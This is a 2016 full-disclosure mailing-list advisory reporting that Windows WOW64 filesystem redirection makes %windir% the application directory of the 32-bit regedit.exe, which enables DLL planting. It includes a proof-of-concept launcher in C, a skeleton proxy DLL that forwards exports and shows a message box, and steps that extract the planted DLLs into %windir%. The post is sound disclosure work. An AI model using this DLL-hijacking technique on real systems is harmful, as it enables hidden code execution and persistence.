@@ -1,0 +1,124 @@
+
+Date: Thu, 20 Oct 2016 12:53:01 +0200
+From: "Stefan Kanthak" <stefan.kanthak@...go.de>
+To: <fulldisclosure@...lists.org>
+Cc: <bugtraq@...urityfocus.com>
+Subject: Defense in depth -- the Microsoft way (part 45): filesystem redirection fails to redirect the application directory
+
+Hi @ll,
+
+on x64 editions of Windows, RegEdit.exe exists both as
+%windir%\regedit.exe and %windir%\SysWOW64\regedit.exe.
+
+<https://msdn.microsoft.com/en-us/library/aa384187.aspx> states
+
+| [...] whenever a 32-bit application attempts to access [...]
+| %windir%\regedit.exe is redirected to %windir%\SysWOW64\regedit.exe.
+
+But what is the "application directory" when a 32-bit application
+runs %windir%\regedit.exe?
+Is it %windir% or %windir%\SysWOW64, i.e. is it determined before
+or after the redirection?
+
+Remember that the "application directory" comes first in the
+standard/default DLL search order, as documented in
+<https://msdn.microsoft.com/en-us/library/ms682586.aspx>
+
+Since the 32-bit system DLLs are located in %windir%\SysWOW64, NOT
+in %windir%, this makes a difference...
+
+
+1. compile the following source as 32-bit program:
+
+--- POC.C ---
+#pragma comment(lib, "KERNEL32.LIB")
+
+#pragma comment(linker, "/ENTRY:WinMainCRTStartup")
+#pragma comment(linker, "/SUBSYSTEM:Windows")
+
+#include <windows.h>
+
+void WinMainCRTStartup()
+{
+    STARTUPINFO si = {sizeof(STARTUPINFO)};
+    PROCESS_INFORMATION pi = {0};
+
+    if (!CreateProcess("C:\\Windows\\regedit.exe", "* /M",
+                       NULL, NULL, FALSE, 0L, NULL, NULL, &si, &pi))
+        ExitProcess(GetLastError());
+
+    if (WaitForSingleObject(pi.hProcess, INFINITE) == WAIT_FAILED)
+        ExitProcess(GetLastError());
+
+    if (!CloseHandle(pi.hThread))
+        ExitProcess(GetLastError());
+
+    if (!CloseHandle(pi.hProcess))
+        ExitProcess(GetLastError());
+
+    ExitProcess(ERROR_SUCCESS);
+}
+--- EOF ---
+
+
+2. download <http://home.arcor.de/skanthak/temp/REGEDIT.CAB> and
+   extract its contents to %windir%:
+      WUSA.EXE /Extract:REGEDIT.CAB %windir%
+   (yes, this needs administrative privileges, but that's NOT the
+   point here).
+
+   The 32-bit DLLs in REGEDIT.CAB are transparent proxies: they
+   export all symbols and ordinals of their counterparts found in
+   the "system directory" and forward them to these counterparts.
+
+--- FORWARD.C ---
+#pragma comment(linker, "/DLL")
+#pragma comment(linker, "/ENTRY:_DllMainCRTStartup")
+#pragma comment(linker, "/EXPORT:<symbol>=System32\\<filename>.<symbol>,@<ordinal>")
+...
+#pragma comment(linker, "/EXPORT:<ordinal>=System32\\<filename>.#<ordinal>,@<ordinal>,NONAME")
+...
+#pragma comment(linker, "/SUBSYSTEM:Windows")
+
+#include <windows.h>
+
+BOOL WINAPI _DllMainCRTStartup(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+{
+    MessageBox(...);
+
+    return TRUE;
+}
+--- EOF ---
+
+   See <http://home.arcor.de/skanthak/sentinel.html> for details.
+
+
+3. run the program compiled in step 1: notice the message boxes
+   displayed from the DLLs extracted to %windir% in step 2 and
+   loaded by %windir%\SysWOW64\regedit.exe: the "application
+   directory" of %windir%\SysWOW64\regedit.exe is %windir%\, NOT
+   %windir%\SysWOW64\!
+
+   Or use the 32-bit NTSD.EXE run %windir%\regedit.exe: you'll see
+   the message boxes too plus the debugger output as shown in
+   <http://home.arcor.de/skanthak/temp/REGEDIT.TXT>
+
+
+4. finally use the 64-bit NTSD.EXE to run %windir%\regedit.exe:
+   see <http://home.arcor.de/skanthak/temp/REGEDIT.LOG> for the
+   debugger output.
+
+   Notice that the 32-bit forwarder DLLs are loaded in the 64-bit
+   process and that their exports/forwards are processed properly!
+
+   Their DllMain() extry points are but NOT called (if they were
+   you'd see some message boxes)!
+
+
+stay tuned
+Stefan Kanthak
+
+
+PS: the test whether 64-bit forwarder DLLs placed in %windir% are
+    loaded in the 32-bit process %windir%\SysWOW64\regedit.exe is
+    left as an exercise to the reader.
